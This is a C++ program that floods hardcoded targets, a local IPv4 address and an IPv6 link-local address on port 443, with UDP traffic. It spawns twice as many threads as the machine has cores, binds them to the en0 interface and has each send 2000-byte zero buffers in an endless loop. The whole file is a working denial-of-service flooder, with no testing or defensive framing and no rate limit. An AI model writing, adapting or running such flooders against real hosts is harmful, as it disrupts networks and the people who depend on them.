#include <arpa/inet.h>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <string>
#include <net/if.h> // for if_nametoindex

int main() {
    // --- Hardcoded target information ---
    const std::string ip_v4 = "192.168.68.1";
    const std::string ip_v6 = "fe80::5ea6:e6ff:fe18:32c0";
    const uint16_t port = 443;
    const char* iface = "en0"; // <--- interface name
    // --- End of hardcoded values ---

    // Get interface index
    unsigned int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        std::cerr << "Failed to get index for interface " << iface << "\n";
        return 1;
    }

    const int threads = static_cast<int>(std::thread::hardware_concurrency()*2);
    std::cout << "Spawning " << threads << " senders\n";
    std::cout << "Targeting IPv4: " << ip_v4 << ":" << port << "\n";
    std::cout << "Targeting IPv6: " << ip_v6 << ":" << port << "\n";
    std::cout << "Binding to interface: " << iface << " (index " << ifindex << ")\n";

    std::vector<std::thread> pool;
    for (int id = 0; id < threads; ++id) {
        pool.emplace_back([=]() {
            int fd_v4 = -1;
            int fd_v6 = -1;

            // --- Setup IPv4 Socket ---
            fd_v4 = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (fd_v4 >= 0) {
                // Bind to interface
                if (setsockopt(fd_v4, IPPROTO_IP, IP_BOUND_IF, &ifindex, sizeof(ifindex)) != 0) {
                    std::cerr << "Thread " << id << ": Failed to bind IPv4 socket to interface " << iface << "\n";
                    close(fd_v4);
                    fd_v4 = -1;
                } else {
                    sockaddr_in dst_v4{};
                    dst_v4.sin_family = AF_INET;
                    dst_v4.sin_port = htons(port);
                    if (inet_pton(AF_INET, ip_v4.c_str(), &dst_v4.sin_addr) == 1) {
                        connect(fd_v4, reinterpret_cast<sockaddr*>(&dst_v4), sizeof(dst_v4));
                        int buf = 4 * 1024 * 1024 * 2;
                        setsockopt(fd_v4, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                    } else {
                        std::cerr << "Thread " << id << ": Invalid IPv4 address. Closing v4 socket.\n";
                        close(fd_v4);
                        fd_v4 = -1;
                    }
                }
            } else {
                std::cerr << "Thread " << id << ": Failed to create IPv4 socket.\n";
            }

            // --- Setup IPv6 Socket ---
            fd_v6 = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (fd_v6 >= 0) {
                // Bind to interface
                if (setsockopt(fd_v6, IPPROTO_IPV6, IPV6_BOUND_IF, &ifindex, sizeof(ifindex)) != 0) {
                    std::cerr << "Thread " << id << ": Failed to bind IPv6 socket to interface " << iface << "\n";
                    close(fd_v6);
                    fd_v6 = -1;
                } else {
                    sockaddr_in6 dst_v6{};
                    dst_v6.sin6_family = AF_INET6;
                    dst_v6.sin6_port = htons(port);
                    if (inet_pton(AF_INET6, ip_v6.c_str(), &dst_v6.sin6_addr) == 1) {
                        connect(fd_v6, reinterpret_cast<sockaddr*>(&dst_v6), sizeof(dst_v6));
                        int buf = 4 * 1024 * 1024;
                        setsockopt(fd_v6, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
                    } else {
                        std::cerr << "Thread " << id << ": Invalid IPv6 address. Closing v6 socket.\n";
                        close(fd_v6);
                        fd_v6 = -1;
                    }
                }
            } else {
                std::cerr << "Thread " << id << ": Failed to create IPv6 socket.\n";
            }

            if (fd_v4 < 0 && fd_v6 < 0) {
                return;
            }

            const size_t payload_size = 2000;
            char dummy[payload_size] = {0};
            for (;;) {
                if (fd_v4 >= 0) {
                    write(fd_v4, dummy, sizeof(dummy));
                    write(fd_v4, dummy, sizeof(dummy));
                }
                if (fd_v6 >= 0) {
                    write(fd_v6, dummy, sizeof(dummy));
                    write(fd_v6, dummy, sizeof(dummy));
                }
            }

            if (fd_v4 >= 0) close(fd_v4);
            if (fd_v6 >= 0) close(fd_v6);
        });
    }

    for (auto& t : pool) t.join();
    return 0;
}
